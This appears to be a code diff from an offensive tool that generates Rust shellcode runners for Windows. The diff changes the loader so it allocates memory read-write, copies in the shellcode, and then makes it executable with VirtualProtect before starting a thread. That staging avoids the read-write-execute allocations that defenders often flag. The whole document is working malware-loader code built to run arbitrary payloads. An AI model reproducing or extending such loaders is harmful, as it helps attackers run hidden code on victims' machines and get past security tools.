@@ -5,9 +5,10 @@ class shellcoderunner:
     def imports(self) -> list[str]:
         return ['extern crate windows_sys;', 
                 'use windows_sys::Win32::System::Memory::VirtualAlloc;', 
+                'use windows_sys::Win32::System::Memory::VirtualProtect;', 
                 'use windows_sys::Win32::System::Threading::CreateThread;', 
                 'use windows_sys::Win32::System::Threading::WaitForSingleObject;', 
-                'use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};',
+                'use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE};',
                 'use std::ptr;'
         ]
 
@@ -25,10 +26,18 @@ class shellcoderunner:
             ptr::null_mut(),
             shellcode.len(),
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE, 
+            PAGE_READWRITE, 
         );
 		
         std::ptr::copy_nonoverlapping(shellcode.as_ptr(), func_addr as *mut u8, shellcode.len());
+
+        let mut old_protect = 0;
+        {VirtualProtect}(
+            func_addr,
+            shellcode.len(),
+            PAGE_EXECUTE_READWRITE,
+            &mut old_protect, 
+        );
 
         let h_thread = {CreateThread}( 
             ptr::null_mut(), 
